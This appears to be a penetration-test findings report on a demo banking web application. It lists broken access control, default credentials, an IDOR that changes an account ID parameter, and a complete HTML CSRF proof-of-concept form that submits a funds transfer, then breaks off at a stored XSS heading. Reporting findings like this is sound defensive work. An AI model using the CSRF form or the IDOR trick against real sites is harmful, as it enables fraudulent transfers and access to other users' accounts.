    Technical Findings
    


    1 Broken Access Control & Sensitive Admin Exposure
    
→ A01:2021 - Broken Access Control

The admin panel is accessible without authentication, exposing sensitive user information and administrative functionality.

Affected Endpoints:

  • /admin/
    • 

  • /errors/logs
    • 

Evidence:




    2 Default Credentials Exposure
    
→ A07:2021 - Identification and Authentication Failures

The application exposes default credentials through the login help feature.

Evidence:


    Credentials > username:password
    


    3 Insecure Direct Object Reference (IDOR)
    
→ A01:2021 - Broken Access Control

The application does not validate user authorization when accessing account data.

Proof:

    /account-activity.html?accountId=1 → accountId=2
    

Evidence:



    4 Cross Site Request Forgery (CSRF)
    
→ A01:2021 - Broken Access Control

Sensitive actions (fraud transfer) due to lack of CSRF protection

Proof:

    
<!DOCTYPE html>
<html lang="en">
    <body>
        <h1>Form CSRF PoC</h1>
        <form method="POST" action="http://zero.webappsecurity.com/bank/transfer-funds-confirm.html">
            <input type="hidden" name="fromAccountId" value="1">
            <input type="hidden" name="toAccountId" value="1">
            <input type="hidden" name="amount" value="500">
            <input type="hidden" name="description" value="CSRF">
            <input type="submit" value="Submit Request">
        </form>
    </body>
</html>

    

Evidence:



    5 Stored XSS
    
→ A03:2021 - Injection
